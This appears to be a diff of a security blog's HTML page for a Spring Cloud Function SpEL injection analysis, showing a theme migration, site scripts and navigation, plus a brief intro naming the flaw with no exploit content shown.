@@ -1,402 +1,391 @@
-<!DOCTYPE html>
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>SpringCloud Function SPEL RCE analysis | S0cke3t Blog</title><meta name="keywords" content="Java,Spring"><meta name="author" content="S0cke3t"><meta name="copyright" content="S0cke3t"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="SpringCloud Function SPEL RCE analysis"><meta name="application-name" content="SpringCloud Function SPEL RCE analysis"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="SpringCloud Function SPEL RCE analysis"><meta property="og:url" content="https://www.saferoad.cc/Analysis/SpringCloud-Function-SPEL-RCE-analysis.html"><meta property="og:site_name" content="S0cke3t Blog"><meta property="og:description" content="前言近日，Spring Cloud Function 官方测试用例曝光了 Spring Cloud Function SPEL 表达式注入漏洞，可利用该漏洞通过注入 SPEL 表达式来触发远程命令执行。Spring Cloud Function 是一个基于 Spring Boot 的函数计算框架。通"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291415715.jpg"><meta property="article:author" content="S0cke3t"><meta property="article:tag" content="渗透测试,CISP-PTE,代码审计,破解,移动安全,安全工具,漏洞利用"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291415715.jpg"><meta name="description" content="前言近日，Spring Cloud Function 官方测试用例曝光了 Spring Cloud Function SPEL 表达式注入漏洞，可利用该漏洞通过注入 SPEL 表达式来触发远程命令执行。Spring Cloud Function 是一个基于 Spring Boot 的函数计算框架。通"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://www.saferoad.cc/Analysis/SpringCloud-Function-SPEL-RCE-analysis"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2024/07/27/125766904/ba62475f396df9de3316a08ed9e65d86_5680958632268053399..png"},
+  postHeadAiDescription: undefined,
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: false,
+  mainTone: undefined,
+  authorStatus: {"skills":["🤖️ 数码科技爱好者","🔍 分享与热心帮助","🏠 智能家居小能手","🔨 设计开发一条龙","🤝 专修交互与设计","🏃 脚踏实地行动派","🧱 团队小组发动机","💢 壮汉人狠话不多"]},
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: S0cke3t","link":"链接: ","source":"来源: S0cke3t Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'S0cke3t Blog',
+  title: 'SpringCloud Function SPEL RCE analysis',
+  postAI: '',
+  pageFillDescription: '前言, 影响版本, 环境构建, 漏洞复现, 漏洞分析, 修复, 参考前言近日官方测试用例曝光了表达式注入漏洞可利用该漏洞通过注入表达式来触发远程命令执行是一个基于的函数计算框架通过抽象传输细节和基础设施为开发者保留熟悉的开发工具和开发流程让开发者专注于实现业务逻辑从而提高开发效率影响版本环境构建使用上师傅创建的环境拉取仓库后用进行打包调试即可由于默认端口使用的所以可能会与冲突可编辑修改默认端口漏洞复现待服务端启动后向服务请求如下数据包漏洞分析首先来看一下官方提交的根据官方可以得知该漏洞是由功能所导致在中官方也给出了相应的测试用例根据测试用例可以得知漏洞触发点位于中字段首先在所有路由的上打入断点程序在进入到后获取了当前的随后进入到跟进在中首先获取了当前的随后调用该对象的中紧接着调用了的中首先判断是否是如果不是则获取其属性并调用其方法而在此处当前的属性正好是一个中直接调用了方法所以直接来看在中判断头中是否有随后调用到中即调用对传入的表达式进行解析随后调用执行修复在修复版本中对使用进行安全处理参考',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-03-31 21:18:00',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-<html lang="zh-CN">
-
-<head>
-    
-    <title>SpringCloud Function SPEL RCE analysis - S0cke3t&#39;s Blog</title>
-    <meta charset="UTF-8">
-    <meta name="description" content="">
-    <meta name="keywords" content="渗透测试,CISP-PTE,代码审计,破解,移动安全,安全工具,漏洞利用">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
-    
-    
-
-    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
-    <meta name="description" content="SpringCloud Function SPEL表达式 RCE 漏洞分析">
-<meta property="og:type" content="article">
-<meta property="og:title" content="SpringCloud Function SPEL RCE analysis">
-<meta property="og:url" content="https://www.saferoad.cc/Analysis/SpringCloud-Function-SPEL-RCE-analysis.html">
-<meta property="og:site_name" content="S0cke3t&#39;s Blog">
-<meta property="og:description" content="SpringCloud Function SPEL表达式 RCE 漏洞分析">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291252633.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291257431.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291259230.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291407572.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291309615.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291341310.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291343055.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291345377.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291348933.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291352844.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291356623.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291400948.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291406532.png">
-<meta property="article:published_time" content="2022-03-29T04:46:03.000Z">
-<meta property="article:modified_time" content="2022-03-31T13:18:00.000Z">
-<meta property="article:author" content="S0cke3t">
-<meta property="article:tag" content="Java">
-<meta property="article:tag" content="Spring">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291252633.png">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css,npm/hexo-theme-nexmoe@latest/source/lib/mdui_043tiny/css/mdui.css,npm/hexo-theme-nexmoe@latest/source/lib/iconfont/iconfont.css?v=233" crossorigin>
-    <link rel="stylesheet" href="/css/style.css?v=1710043516196">
-     
-    
-    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1710043516196">
-    
-<meta name="generator" content="Hexo 6.1.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
-<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
-
-<body class="mdui-drawer-body-left">
-    
-    <div id="nexmoe-background">
-        <div class="nexmoe-bg" style="background-image: url(https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/newbolg/202203272236776.jpg)"></div>
-        <div class="mdui-appbar mdui-shadow-0">
-            <div class="mdui-toolbar">
-                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
-                <div class="mdui-toolbar-spacer"></div>
-                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
-                <a href="/" title="S0cke3t" class="mdui-btn mdui-btn-icon"><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/202203272159225.jpg" alt="S0cke3t"></a>
-            </div>
-        </div>
-    </div>
-    <div id="nexmoe-header">
-        
-<meta name="keywords" content="渗透测试,CISP-PTE,代码审计,破解,移动安全,安全工具,漏洞利用">
-
-<div class="nexmoe-drawer mdui-drawer" id="drawer">
-    <div class="nexmoe-avatar mdui-ripple">
-        <a href="/" title="S0cke3t">
-            <img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/202203272159225.jpg" alt="S0cke3t" alt="S0cke3t">
-        </a>
-    </div>
-    <div class="nexmoe-count">
-        <div><span>文章</span>43</div>
-        <div><span>标签</span>29</div>
-        <div><span>分类</span>12</div>
-    </div>
-    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
-        
-        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
-            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
-            <div class="mdui-list-item-content">
-                回到首页
-            </div>
-        </a>
-        
-        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archives.html" title="文章归档">
-            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
-            <div class="mdui-list-item-content">
-                文章归档
-            </div>
-        </a>
-        
-        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/aboutme.html" title="关于我">
-            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
-            <div class="mdui-list-item-content">
-                关于我
-            </div>
-        </a>
-        
-    </div>
-    <aside id="nexmoe-sidebar">
-    
-    <div class="nexmoe-widget-wrap">
-    <div class="nexmoe-widget nexmoe-search">
-         
-            <form id="search_form" action_e="https://cn.bing.com/search?q=site:saferoad.cc" onsubmit="return search();">
-                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
-            </form>
-         
-    </div>
-</div>
-    
-    <div class="nexmoe-widget-wrap">
-    <div class="nexmoe-widget nexmoe-social">
-        <a class="mdui-ripple" href="https://github.com/DeEpinGh0st/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
-            <i class="nexmoefont icon-github"></i>
-        </a>
-    </div>
-</div>
-    
-    
-  <div class="nexmoe-widget-wrap">
-    <h3 class="nexmoe-widget-title">文章分类</h3>
-    <div class="nexmoe-widget">
-
-      <ul class="category-list">
-
-        
-
-
-        
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/Analysis/">Analysis</a>
-          <span class="category-list-count">11</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/Android/">Android</a>
-          <span class="category-list-count">1</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/Audit/">Audit</a>
-          <span class="category-list-count">1</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/Bypass/">Bypass</a>
-          <span class="category-list-count">1</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/CISP-PTE/">CISP-PTE</a>
-          <span class="category-list-count">2</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/Case-share/">Case share</a>
-          <span class="category-list-count">1</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/Crack/">Crack</a>
-          <span class="category-list-count">3</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/Deserialization/">Deserialization</a>
-          <span class="category-list-count">3</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/Docker/">Docker</a>
-          <span class="category-list-count">1</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/Emergency/">Emergency</a>
-          <span class="category-list-count">1</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/Notes/">Notes</a>
-          <span class="category-list-count">7</span>
-        </li>
-
-        
-
-        <li class="category-list-item">
-          <a class="category-list-link" href="/categories/Sectool/">Sectool</a>
-          <span class="category-list-count">11</span>
-        </li>
-
-        
-      </ul>
-
-    </div>
-  </div>
-
-
-    
-    
-  <div class="nexmoe-widget-wrap">
-    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
-      <a href="/tags/ASP-NET/" style="font-size: 12.5px;">ASP.NET</a> <a href="/tags/Bypass/" style="font-size: 15px;">Bypass</a> <a href="/tags/Csharp/" style="font-size: 17.5px;">Csharp</a> <a href="/tags/Django/" style="font-size: 10px;">Django</a> <a href="/tags/Domain-security/" style="font-size: 10px;">Domain security</a> <a href="/tags/Flink/" style="font-size: 10px;">Flink</a> <a href="/tags/Frida/" style="font-size: 10px;">Frida</a> <a href="/tags/Hook/" style="font-size: 10px;">Hook</a> <a href="/tags/Java/" style="font-size: 20px;">Java</a> <a href="/tags/KeyGen/" style="font-size: 10px;">KeyGen</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Nim/" style="font-size: 12.5px;">Nim</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Portainer/" style="font-size: 10px;">Portainer</a> <a href="/tags/Python/" style="font-size: 15px;">Python</a> <a href="/tags/Realor/" style="font-size: 10px;">Realor</a> <a href="/tags/Reappearance/" style="font-size: 10px;">Reappearance</a> <a href="/tags/SecTool/" style="font-size: 10px;">SecTool</a> <a href="/tags/Seeyon/" style="font-size: 10px;">Seeyon</a> <a href="/tags/Spring/" style="font-size: 15px;">Spring</a> <a href="/tags/Sqlmap/" style="font-size: 10px;">Sqlmap</a> <a href="/tags/Struts2/" style="font-size: 10px;">Struts2</a> <a href="/tags/ThinkPHP/" style="font-size: 10px;">ThinkPHP</a> <a href="/tags/Windows/" style="font-size: 12.5px;">Windows</a> <a href="/tags/WordPress/" style="font-size: 10px;">WordPress</a> <a href="/tags/cuckoo/" style="font-size: 10px;">cuckoo</a> <a href="/tags/sandbox/" style="font-size: 10px;">sandbox</a> <a href="/tags/solution/" style="font-size: 10px;">solution</a>
-    </div>
-    
-  </div>
-
-    
-</aside>
-    <div class="nexmoe-copyright">
-        &copy; 2024 S0cke3t
-        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
-        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
-        <br/>Too Young Too Sample
-    </div>
-</div><!-- .nexmoe-drawer -->
-    </div>
-    <div id="nexmoe-content">
-        <div class="nexmoe-primary">
-            <div class="nexmoe-post">
-
-  <article>
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
       
-          <div class="nexmoe-post-cover" style="padding-bottom: NaN%;"> 
-              <img data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291415715.jpg" data-sizes="auto" alt="SpringCloud Function SPEL RCE analysis" class="lazyload">
-              <h1>SpringCloud Function SPEL RCE analysis</h1>
-          </div>
+        get: key => {
+          const itemStr = localStorage.getItem(key)
       
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
       
-      <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
-    <a><i class="nexmoefont icon-calendar-fill"></i>2022年03月29日</a>
-    <a><i class="nexmoefont icon-areachart"></i>728 字</a>
-    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 3 分钟</a>
-</div>
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
 
-      
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
 
-      <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>近日，Spring Cloud Function 官方测试用例曝光了 Spring Cloud Function SPEL 表达式注入漏洞，可利用该漏洞通过注入 SPEL 表达式来触发远程命令执行。Spring Cloud Function 是一个基于 Spring Boot 的函数计算框架。通过抽象传输细节和基础设施，为开发者保留熟悉的开发工具和开发流程，让开发者专注于实现业务逻辑，从而提高开发效率。</p>
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.1.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://saferoad.cc" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://github.com/DeEpinGh0st" title="Github"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://github.githubassets.com/favicons/favicon.svg" alt="Github"/><span class="back-menu-item-text">Github</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">S0cke3t Blog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 归档</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/ASP-NET/" style="font-size: 1.05rem;">ASP.NET<sup>2</sup></a><a href="/tags/Bypass/" style="font-size: 1.05rem;">Bypass<sup>4</sup></a><a href="/tags/Csharp/" style="font-size: 1.05rem;">Csharp<sup>4</sup></a><a href="/tags/Django/" style="font-size: 1.05rem;">Django<sup>1</sup></a><a href="/tags/Domain-security/" style="font-size: 1.05rem;">Domain security<sup>1</sup></a><a href="/tags/Flink/" style="font-size: 1.05rem;">Flink<sup>1</sup></a><a href="/tags/Frida/" style="font-size: 1.05rem;">Frida<sup>1</sup></a><a href="/tags/Hook/" style="font-size: 1.05rem;">Hook<sup>1</sup></a><a href="/tags/Java/" style="font-size: 1.05rem;">Java<sup>10</sup></a><a href="/tags/KeyGen/" style="font-size: 1.05rem;">KeyGen<sup>1</sup></a><a href="/tags/Linux/" style="font-size: 1.05rem;">Linux<sup>1</sup></a><a href="/tags/Nim/" style="font-size: 1.05rem;">Nim<sup>3</sup></a><a href="/tags/PHP/" style="font-size: 1.05rem;">PHP<sup>3</sup></a><a href="/tags/Pentest/" style="font-size: 1.05rem;">Pentest<sup>1</sup></a><a href="/tags/Portainer/" style="font-size: 1.05rem;">Portainer<sup>1</sup></a><a href="/tags/Python/" style="font-size: 1.05rem;">Python<sup>3</sup></a><a href="/tags/Realor/" style="font-size: 1.05rem;">Realor<sup>1</sup></a><a href="/tags/Reappearance/" style="font-size: 1.05rem;">Reappearance<sup>1</sup></a><a href="/tags/SecTool/" style="font-size: 1.05rem;">SecTool<sup>3</sup></a><a href="/tags/Seeyon/" style="font-size: 1.05rem;">Seeyon<sup>1</sup></a><a href="/tags/Spring/" style="font-size: 1.05rem;">Spring<sup>3</sup></a><a href="/tags/Sqlmap/" style="font-size: 1.05rem;">Sqlmap<sup>1</sup></a><a href="/tags/Struts2/" style="font-size: 1.05rem;">Struts2<sup>1</sup></a><a 